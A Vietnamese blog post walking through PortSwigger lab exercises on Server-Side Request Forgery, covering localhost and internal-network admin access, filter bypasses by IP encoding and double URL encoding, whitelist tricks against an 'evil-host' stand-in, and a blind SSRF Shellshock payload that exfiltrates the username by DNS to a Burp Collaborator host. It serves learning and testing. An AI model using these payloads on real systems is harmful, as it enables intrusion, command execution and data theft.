---
title: Learning about Sever Side Request Forgery
published: 2024-10-07
tags: [HTB, Pentest]
description: Learning about SSRF Vuln
category: Learning
author: Trohan0x00
draft: false
image: "/assets/post_image/ssrf.png"
---


# Server Side Forgery Request (SSRF) 

## I. SSRF là gì?
![image](https://hackmd.io/_uploads/HkqFQp1kyl.png)
* Lỗ hỏng `
SSRF (Server-Side Request Forgery)` hiểu đơn giản là lỗ hỏng mà các attacker có thể lừa máy chủ thực hiện các `Requests HTTP` thay cho chúng. Điều này xảy ra khi ứng dụng web chấp nhận URL hoặc các đầu vào từ người dùng và sử dụng chúng để thực hiện các yêu cầu đến các tài nguyên bên ngoài hoặc nội bộ mà không xác thực hoặc kiểm tra nguồn gốc của chúng một cách đúng đắn.

## II. Hậu quả do SSRF gây ra là gì
* Một cuộc tấn công `SSRF` thành công thường dẫn đến các hành động trái phép hoặc truy cập dữ liệu trong tổ chức. Điều này có thể xảy ra trong ứng dụng dễ bị tấn công hoặc trên các hệ thống phía sau mà ứng dụng có thể giao tiếp. Trong một số tình huống, lỗ hổng SSRF có thể cho phép kẻ tấn công thực hiện lệnh tùy ý.
* Khai thác `SSRF` có thể dẫn đến kết nối với các hệ thống bên thứ ba bên ngoài, gây ra các cuộc tấn công tiếp diễn ác ý. Những cuộc tấn công này có thể xuất hiện như bắt nguồn từ tổ chức đang lưu trữ ứng dụng dễ bị tấn công.


## III. Các loại SSRF phổ biến

* Theo `Portswigger` thì mình sẽ chia ra các trường hợp tấn công `SSRF` phổ biến mà các attacker có thể sử dụng thành 2 loại là `Active SSRF` và `Blind SSRF` trong đó:
    1. `Active SSRF` là loại phổ biến nhất, khi kẻ tấn công có thể thấy được phản hồi ngay lập tức từ máy chủ sau khi thực hiện yêu cầu `SSRF`. Attacker sử dụng loại `SSRF` này để khám phá các dịch vụ mạng nội bộ, truy cập tài nguyên không thể truy cập từ bên ngoài, và đọc nội dung từ các dịch vụ đó.
    * Ví dụ:
        * Các Attacker nhập URL nội bộ, như `http://localhost/admin`, để tải một trang quản trị nội bộ.
        * Kết quả của yêu cầu này (nội dung của trang quản trị) sẽ được trả về và hiển thị cho Attacker.
    2. `Blind SSRF` xảy ra khi Attacker không thấy được phản hồi trực tiếp từ máy chủ. Tuy nhiên, yêu cầu vẫn được thực hiện từ phía máy chủ đến mục tiêu mà kẻ tấn công mong muốn. Loại `SSRF` này khó khai thác hơn vì kẻ tấn công không thể xác minh ngay lập tức kết quả của cuộc tấn công.
    * Ví dụ:
        * Attacker tạo ra một yêu cầu `SSRF` để truy cập một tài nguyên nội bộ.
        * Máy chủ thực hiện yêu cầu, nhưng không trả lại phản hồi cho kẻ tấn công, khiến cho việc xác định thành công hay thất bại trở nên khó khăn.
        * Tuy nhiên, kẻ tấn công có thể khai thác các tín hiệu gián tiếp, như qua việc gửi dữ liệu đến máy chủ bên ngoài mà họ kiểm soát để nhận được thông tin (ví dụ qua `DNS exfiltration`). 

## IV. Cách khai thác SSRF
### 1. Active SSRF
* Để đi một cách đồng bộ thì mình sẽ thực hành lần lượt các hình thức tấn công của lỗ hỏng ở trên `Portswigger`. Đầu tiên đối với `Active SSRF` thì ta có nhiều hình thức để tấn công như:
    1. Tấn công Server là hình thức tấn công cơ bản nhất mình sẽ nói sau.
    2. Tấn công Bypass Blacklist
    3. Tấn cộng dựa vào Whitelist

* Ta sẽ đi thực hành lần lượt các labs, để nhanh gọn nên mình sẽ chỉ nêu những ý cần nắm cũng như các keyword để thực hiện được các lab này.

#### Lab 1:  Basic SSRF against the local server
* ![image](https://hackmd.io/_uploads/SJJ7QC1yJg.png)
* Với Description trên ta biết được admin interface sẽ nằm ở `http://localhost/admin` vì thế ta cần inject được payload để cho server forward đến `/admin`. Vì lab đầu rất đơn giản nên mình sẽ đi nhanh.
* Dùng `Burp` và check ở phần Checkstock của web ta bắt được request 
    ![image](https://hackmd.io/_uploads/BJmQNRkJke.png)
* Thay thế phần `URL` ở StockAPI bằng payload của ta `http://localhost/admin`
    ![image](https://hackmd.io/_uploads/r1UD4C1J1g.png)
* Render được trang của admin tiếp tục dùng payload `http://localhost/admin/delete?username=carlos` để tiến hành xóa user carlos ra khỏi admin panel 

    ![image](https://hackmd.io/_uploads/Byao4RJkke.png)
#### Lab 2: Basic SSRF against another back-end system
![image](https://hackmd.io/_uploads/Byy-rR1k1e.png)
* Lab này cũng tương tự như Lab 1 nhưng admin interface ở đây sẽ là địa chỉ ip có format là `192.168.0.x:8080` ta vẫn không biết rõ địa chỉ ip của admin nên ta cần có sử trợ giúp của `Intruder`.
    ![image](https://hackmd.io/_uploads/HyaMUCJJyx.png)
* Ta sẽ add position ở x và chọn `Snipper Attack` với payload là Numberlist
    ![image](https://hackmd.io/_uploads/rJW38Ckyyl.png)
* Cận sẽ là từ 1-255, và tiến hành bruteforce
    ![image](https://hackmd.io/_uploads/SyvaLRyJJl.png)
* Kết quả nhận được 1 payload với Status 200 ở ip là `http://192.168.0.50:8080/admin` quay trở lại Repeter và tiến hành khai thác như Lab 1
#### Lab 3: SSRF with blacklist-based input filter
![image](https://hackmd.io/_uploads/r1c6v0yykg.png)
* Lab này sẽ là kỹ thuật `Bypass Blacklist SSRF`. Nói một chút về kỹ thuật này thì một số ứng dụng chặn các đầu vào chứa tên miền như `127.0.0.1` và `localhost`, hoặc các `URL` nhạy cảm như `/admin`. Trong trường hợp này,ta có thể vượt qua bộ lọc bằng các kỹ thuật sau:
    * Sử dụng một đại diện IP thay thế cho `127.0.0.1`, chẳng hạn như `2130706433, 017700000001, hoặc 127.1`.
    * Sử dụng double enc URL để có thể bypass trong một vài trường hợp
* Quay trở lại với lab thì tương tự như các lab trước nhưng ở đây việc nhập url không còn đơn giản như trước do server đã deploy một lớp `filter` để lọc `Untrusted Data` 
    ![image](https://hackmd.io/_uploads/Hka6iCJ1Jx.png)
* Khi ta nhập url thông thường thì sẽ nhận được thông báo blocked như này. Vì thế ta có thể thay đổi `locahost` thành địa chỉ ip `127.0.0.1` nhưng vẫn bị blocked. Để bypass ta có thể đổi thành `127.1` và vẫn bị blocked =)))
* Suy nghĩ một lúc thì mình quyết định Double Url enc luôn thằng admin, có vẻ như vẫn đề không đến từ địa chỉ ip của ta mà là đến từ route `/admin` nên mình sẽ enc chữ a thành `%25%36%31` từ đó ta có payload `http://127.1/%25%36%31dmin` 
![image](https://hackmd.io/_uploads/BJmIa0JJyx.png)
* Ta đã tiêm thành công và tiến hành solved như các lab trước thôi

#### Lab 4: SSRF with whitelist-based input filters
![image](https://hackmd.io/_uploads/BJff0AJ1ye.png)
* Lab này sẽ là kỹ thuật lợi dụng Whitelist để bypass
* Một số ứng dụng chỉ cho phép các đầu vào khớp với whitelist các giá trị cho phép. Ta có thể bypass bằng cách khai thác các sự không nhất quán trong quá trình phân tích cú pháp URL.
    * Sử dụng ký tự `@`: Chèn thông tin đăng nhập vào URL trước tên miền (hostname), ví dụ: `https://expected-host:fakepassword@evil-host.`
    * Sử dụng ký tự `#`: Đánh dấu phân đoạn URL (fragment), ví dụ: `https://evil-host#expected-host.`
    * Sử dụng phân cấp `DNS`: Tận dụng phân cấp tên miền để đưa tên miền cần thiết vào một tên miền `DNS` đầy đủ mà bạn kiểm soát, ví dụ: `https://expected-host.evil-host.`
    * URL-encode hoặc double-encode: Mã hóa URL hoặc mã hóa kép để làm rối loạn việc phân tích URL.
* Đến với Lab ta tiến hành check ở phần CheckStock như cũ 
![image](https://hackmd.io/_uploads/B1p8kJeJkx.png)
* Ta nhận thấy rằng whitelist domain name của chúng ta phải là `stock.weliketoshop.net` vì thế ta có thể sử dụng các cách bypass ở bên trên để có thể giải quyết bài này
* Ban đầu mình khá loay hoay với việc bypass này do thử một lúc lâu vẫn không tìm ra được cách bypass whitelist này
    * Và cuối cùng payload đúng là `http://localhost%2523@stock.weliketoshop.net/admin` ta sẽ dùng ký tự `#` để thực hiện. Nhưng cần phải kết hợp với Double Url enc để enc thành `%2523` để qua mặt được filter và theo công thức thì phía sau sẽ là expected_host và route `/admin` 
![image](https://hackmd.io/_uploads/SJZJ-1ly1l.png)
* Tiến hành khai thác xóa user như các lab truóc là xong.

### 2. Blind SSRF 
* Đến với phần này mình sẽ tập trung đến 1 Lab Expert duy nhất là ` Blind SSRF with Shellshock exploitation`
    ![image](https://hackmd.io/_uploads/HkzytMlJkl.png)
* Như đã tìm hiểu ở trên thì chúng ta đã nắm rõ được cơ chế cũng như khả năng tác động của `Blind SSRF`do đó mình sẽ đi thằng vào vấn đề chính. Tên Lab như ta đã thấy là khai thác `Blind SSRF` với việc khai thác `Shellshock`. Vậy, `Shellsock` là gì?
    ![image](https://hackmd.io/_uploads/rkaBKMgk1l.png)
* `Shellshock` là một lỗ hổng bảo mật nghiêm trọng trong `Bash (Bourne Again Shell)`, một trình thông dịch dòng lệnh phổ biến trên nhiều hệ điều hành `Unix` và `Linux`. Lỗ hổng này được phát hiện vào năm 2014 và có thể cho phép kẻ tấn công thực thi mã tùy ý `(RCE)` trên hệ thống bị ảnh hưởng chỉ bằng cách truyền dữ liệu độc hại thông qua các biến môi trường. 
* Nếu một ứng dụng web hoặc dịch vụ nào đó (ví dụ như một máy chủ web CGI) sử dụng `Bash` để xử lý dữ liệu đầu vào của người dùng, kẻ tấn công có thể gửi một yêu cầu chứa mã độc trong biến môi trường. Khi Bash xử lý, nó sẽ thực thi mã độc đó.
`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`
* Trở lại với Lab thì ta được hint một extension của `Burpsuite` dùng để check `Blind SSRF` đó chính là `Collaborator SSRF` nên mình tải về và sử dụng. Tiến hành vào web lab sau khi scan thì đã scan được lỗ hỏng 
    ![image](https://hackmd.io/_uploads/BksicGlyyl.png)
* Như ta thấy, tool check được `SSRF` không chỉ ở `Referer` mà còn ở `User-Agent` tức là phần trình duyệt của user. 
* Minhf search google với keyword là `Shellshock User-Agent` thì tìm được payload để thực hiện inject `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`. Tiến hành dùng `Burp Collaborator` để thực hiện lấy `domain` 
    ![image](https://hackmd.io/_uploads/BygshMgyyx.png)
* Ta thay `Referer` bằng địa chỉ description cho và tuy nhiên ta bị thiếu mất ip hoàn chỉnh do đó mình sẽ dùng `Intruder` để brute
    ![image](https://hackmd.io/_uploads/r14mazl1yx.png)
* Payload sẽ dùng `Numbers list` như các bài trước và tiến hành brute. 
    ![image](https://hackmd.io/_uploads/H1iQ_B-kye.png)
* Khi brute xong và tiến hành pol về thì ta nhận được một DNS query với tên user ta cần tìm là `peter-JxMNYr`